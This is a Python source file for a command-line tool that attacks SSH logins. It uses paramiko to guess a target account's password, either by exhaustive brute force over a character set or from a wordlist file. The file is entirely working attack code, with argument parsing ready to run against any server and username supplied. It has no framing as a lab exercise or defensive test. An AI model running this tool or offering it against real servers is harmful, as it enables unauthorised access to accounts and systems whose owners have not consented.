import argparse
from paramiko import SSHClient, AutoAddPolicy, AuthenticationException
import itertools
import string
import time

client = SSHClient()
client.set_missing_host_key_policy(AutoAddPolicy())

def brute_force_ssh(username:str, server:str, charset:str, min_length:int, max_length:int):
    """
    Attempts to brute-force an SSH password by generating all possible
    combinations of the given character set within a specified length range.

    Args:
        username (str): The username to authenticate.
        server (str): The server address (hostname or IP) to connect to.
        charset (str): A string representing the set of characters to use in generating passwords.
        min_length (int): The minimum length of the passwords to try.
        max_length (int): The maximum length of the passwords to try.

    Returns:
        str: The password if successfully found, or None if no password was found.
    
    Raises:
        AuthenticationException: If authentication fails for the tried password.
        Exception: If other connection errors occur.

    Example:
        >>> brute_force_ssh('admin', '192.168.1.1', 'abc123', 1, 4)
        # This will attempt to connect using combinations of 'abc123' from length 1 to 4.
    """

    for length in range(min_length, max_length + 1):
        for password in itertools.product(charset, repeat=length):
            password = ''.join(password)
            print(password)
            try:
                time.sleep(3)
                client.connect(server, username=username, password=password, timeout=6000)
                print(f"Password found: {password}")
                client.close()
                return password
            except AuthenticationException:
                client.close()
                continue
            except Exception as e:
                print(f"Error: {e}")
                return None

    print("Password not found.")
    return None

def dictionary_attack(username:str, server:str, wordlist:str):
    """
    Attempts to authenticate to an SSH server using passwords from a provided wordlist file.

    Args:
        username (str): The username to authenticate.
        server (str): The server address (hostname or IP) to connect to.
        wordlist (str): The path to a file containing a list of passwords to try, one per line.

    Returns:
        str: The password if successfully found, or None if no password was found.
    
    Raises:
        AuthenticationException: If authentication fails for the tried password.
        Exception: If other connection errors occur.

    Example:
        >>> dictionary_attack('admin', '192.168.1.1', 'passwords.txt')
        # This will attempt to connect using passwords listed in 'passwords.txt'.
    """

    with open(wordlist, 'r', encoding='utf-8', errors='ignore') as file:
        for line in file:
        # for password in ['hallo', '12345', 'kali']:
            password = line.strip()
            # password = password.strip()
            print(password)
            try:
                time.sleep(3)
                client.connect(server, username=username, password=password)
                print(f"Password found: {password}")
                client.close()
                return password
            except AuthenticationException:
                client.close()
                continue
            except Exception as e:
                print(f"Error: {e}")
                return None

    print("Password not found.")
    return None

def main():
    parser = argparse.ArgumentParser(description="SSH Brute Force and Dictionary Attack Tool")
    parser.add_argument('-u', '--username', required=True, help="Username for SSH login")
    parser.add_argument('-s', '--server', required=True, help="Server IP or DNS for SSH login")
    parser.add_argument('-w', '--wordlist', help="Wordlist for dictionary attack")
    parser.add_argument('--min', type=int, default=4, help="Minimum length of passwords for brute force (default: 4)")
    parser.add_argument('--max', type=int, default=8, help="Maximum length of passwords for brute force (default: 8)")
    parser.add_argument('-c', '--charset', default=string.ascii_lowercase, help="Charset for brute force attack (default: lowercase letters)")

    args = parser.parse_args()

    if args.wordlist:
        dictionary_attack(args.username, args.server, args.wordlist)
    else:
        brute_force_ssh(args.username, args.server, args.charset, args.min, args.max)

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        exit()